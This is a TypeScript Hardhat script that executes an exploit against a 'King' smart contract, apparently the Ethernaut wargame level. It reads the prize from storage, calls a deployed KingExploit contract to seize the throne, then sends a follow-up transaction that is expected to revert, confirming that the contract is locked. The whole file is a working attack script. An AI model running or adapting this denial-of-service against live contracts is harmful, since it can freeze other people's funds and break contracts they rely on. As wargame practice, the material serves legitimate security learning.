import "@ethersproject/abstract-provider"
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts } from "hardhat"


import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    const {deployer,exploiter}= await getNamedAccounts()
    const exploiterAcc= await ethers.getSigner(exploiter)

    const kingExploitDeployment=await deployments.get('KingExploit')
    const kingExploit = await ethers.getContractAt('KingExploit',kingExploitDeployment.address)
    const king= await ethers.getContractAt('King',process.env.KING_ADDRESS as string)
    const newPrize=BigNumber.from(await ethers.provider.getStorageAt(king.address,1)).add(1)

    const tx=await kingExploit.connect(exploiterAcc).exploit({
        value:newPrize,
        gasPrice:(await ethers.provider.getGasPrice()).mul(3)
    })
    await tx.wait()

    console.log("Successful throne steal")

    const secondTx = await exploiterAcc.sendTransaction({
        to: king.address,
        value:BigNumber.from(await ethers.provider.getStorageAt(king.address,1)).add(1),
        gasPrice:(await ethers.provider.getGasPrice()).mul(3),
        gasLimit: 50000
    })
    const rcp=await secondTx.wait()

    if(rcp.status==0){
        console.log("Successful attack")
    }else{
        console.log("Unsuccessful attack")
    }
    

}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
